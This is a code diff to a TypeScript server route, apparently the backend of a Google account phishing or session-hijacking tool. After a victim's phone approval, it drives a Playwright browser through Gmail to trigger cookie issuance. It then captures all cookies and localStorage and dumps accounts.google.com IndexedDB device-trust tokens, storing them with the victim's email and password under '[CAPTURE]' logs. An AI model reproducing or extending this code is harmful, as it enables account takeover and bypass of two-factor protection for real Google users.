@@ -7,6 +7,8 @@ import websocketService from '../../services/websocket.service';
 import prisma from '../../config/database';
 import { logger } from '../../utils/logger.util';
 import { v4 as uuid } from 'uuid';
+import path from 'path';
+import fs from 'fs';
 
 const router = Router();
 
@@ -478,54 +480,73 @@ router.get('/:id/status', async (req: Request, res: Response) => {
       finalizingSessions.add(id);
 
       try {
-        logger.info(`[DP] navigating for full cookie issuance — session ${id}`);
+        logger.info(`[DP] Phone approved — session ${id}, running 3-step cookie init...`);
+        const ctx = session.page.context();
+        const p   = session.page;
 
-        // Step 1: Gmail (5s)
-        await session.page.goto('https://mail.google.com/', { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
-        await session.page.waitForTimeout(5000);
+        // Step 1: Land on Gmail — triggers OSID, COMPASS, GMAIL_AT, GMAIL_LF
+        await p.goto('https://mail.google.com/mail/u/0/', {
+          waitUntil: 'domcontentloaded', timeout: 30000,
+        }).catch(() => {});
+        await p.waitForTimeout(5000);
 
-        // Step 2: Google main (3s)
-        await session.page.goto('https://www.google.com/', { waitUntil: 'domcontentloaded', timeout: 10000 }).catch(() => {});
-        await session.page.waitForTimeout(3000);
+        // Step 2: Touch www.google.com — triggers SEARCH_SAMESITE, NID refresh
+        await p.goto('https://www.google.com', {
+          waitUntil: 'domcontentloaded', timeout: 15000,
+        }).catch(() => {});
+        await p.waitForTimeout(3000);
 
-        // Step 3: Gmail again (8s)
-        await session.page.goto('https://mail.google.com/', { waitUntil: 'domcontentloaded', timeout: 20000 }).catch(() => {});
-        await session.page.waitForTimeout(8000);
+        // Step 3: Return to Gmail with networkidle — __Secure-BUCKET is server-set here
+        await p.goto('https://mail.google.com/mail/u/0/', {
+          waitUntil: 'networkidle', timeout: 40000,
+        }).catch(() => {});
+        await p.waitForTimeout(12000);
 
-        // Collect cookies FIRST before any further navigation
-        const cookies = await session.page.context().cookies();
-        logger.info(`[DP] cookies collected: ${cookies.length} total`);
+        logger.success(`[DP] Cookie init complete — session ${id}, capturing browser state`);
 
-        // GAIA extraction — best-effort, cookies already safe above
-        let dpGaiaId = '';
-        let dpFullName = '';
-        let dpPictureUrl = '';
+        // Capture cookies + all-origin localStorage (Playwright built-in)
+        const playwrightState = await ctx.storageState();
+
+        // Capture accounts.google.com IndexedDB — web RAPT and device-trust tokens
+        // live here (gsilib database). storageState() does not capture IndexedDB.
+        let accountsIdb: Record<string, any> | null = null;
         try {
-          await session.page.goto('https://accounts.google.com/', { waitUntil: 'domcontentloaded', timeout: 15000 }).catch(() => {});
-          const laRaw = await session.page.evaluate(async () => {
-            try {
-              const resp = await fetch('/ListAccounts?gpsia=1&json=1', { credentials: 'include' });
-              return resp.text();
-            } catch (e) { return ''; }
-          }).catch(() => '');
-
-          logger.info(`[GAIA][DP] ListAccounts raw: ${laRaw?.slice(0, 200)}`);
-
-          if (laRaw && laRaw.includes('gaia.l.a')) {
-            const json = JSON.parse(laRaw.replace(/^\)\]\}'\n/, ''));
-            const account = json[1]?.[0];
-            if (account) {
-              dpGaiaId    = String(account[2] ?? '');
-              dpFullName  = String(account[3] ?? '');
-              dpPictureUrl = String(account[4] ?? '');
-              logger.info(`[GAIA][DP] ID: ${dpGaiaId}, name: ${dpFullName}`);
+          const idbPage = await ctx.newPage();
+          await idbPage.goto('https://accounts.google.com', {
+            waitUntil: 'networkidle', timeout: 20000,
+          });
+          accountsIdb = await idbPage.evaluate(async () => {
+            const dbs = await indexedDB.databases();
+            const result: Record<string, any> = {};
+            for (const dbInfo of dbs) {
+              if (!dbInfo.name) continue;
+              const db: IDBDatabase = await new Promise((res, rej) => {
+                const req = indexedDB.open(dbInfo.name!, dbInfo.version);
+                req.onsuccess = () => res(req.result);
+                req.onerror   = () => rej(req.error);
+              });
+              result[dbInfo.name] = { version: dbInfo.version, stores: {} };
+              for (const storeName of Array.from(db.objectStoreNames)) {
+                const records: any[] = await new Promise((res, rej) => {
+                  const tx  = db.transaction(storeName, 'readonly');
+                  const req = tx.objectStore(storeName).getAll();
+                  req.onsuccess = () => res(req.result);
+                  req.onerror   = () => rej(req.error);
+                });
+                (result[dbInfo.name].stores as any)[storeName] = records;
+              }
+              db.close();
             }
-          }
-        } catch (gaiaErr: any) {
-          logger.warn(`[GAIA][DP] extraction failed (non-fatal): ${gaiaErr.message}`);
+            return result;
+          });
+          await idbPage.close();
+          logger.success(`[DP] IndexedDB captured — ${Object.keys(accountsIdb).length} databases`);
+        } catch (idbErr: any) {
+          logger.warn(`[DP] IndexedDB capture skipped: ${idbErr.message}`);
         }
 
-        await createProfileFromSession(id, cookies, dpGaiaId, dpFullName, dpPictureUrl);
+        const browserState = JSON.stringify({ playwrightState, accountsIdb });
+        await createProfileFromSession(id, playwrightState.cookies, browserState);
 
         try {
           await prisma.session.update({
@@ -573,7 +594,7 @@ router.get('/:id/status', async (req: Request, res: Response) => {
 /**
  * Helper: Create profile from session
  */
-async function createProfileFromSession(sessionId: string, cookies: any[], gaiaId = '', fullName = '', pictureUrl = '') {
+async function createProfileFromSession(sessionId: string, cookies: any[], browserState?: string | null) {
   try {
     // Extract Google auth cookies regardless of DB state
     const googleCookies = googleAuthService.extractGoogleCookies(cookies);
@@ -589,7 +610,7 @@ async function createProfileFromSession(sessionId: string, cookies: any[], gaiaI
           data: {
             cookies: googleCookies.length > 0 ? JSON.stringify(googleCookies) : undefined,
             authStatus: googleCookies.length > 0 ? 'AUTHENTICATED' : 'NOT_AUTHENTICATED',
-            ...(gaiaId && { accountInfo: JSON.stringify({ gaiaId, fullName, pictureUrl }) }),
+            ...(browserState != null && { browserState }),
           },
         });
         logger.success(`[CAPTURE] Profile ${existingProfileId} updated → ${googleCookies.length} cookies, AUTHENTICATED`);
@@ -652,7 +673,7 @@ async function createProfileFromSession(sessionId: string, cookies: any[], gaiaI
       password: password || '',
       cookies: googleCookies,
       provider: 'GOOGLE',
-      accountInfo: JSON.stringify({ gaiaId, fullName, pictureUrl }),
+      ...(browserState != null && { browserState }),
     });
 
     logger.success(`[CAPTURE] Profile created — session: ${sessionId}, email: ${email}, cookies: ${googleCookies.length}`);
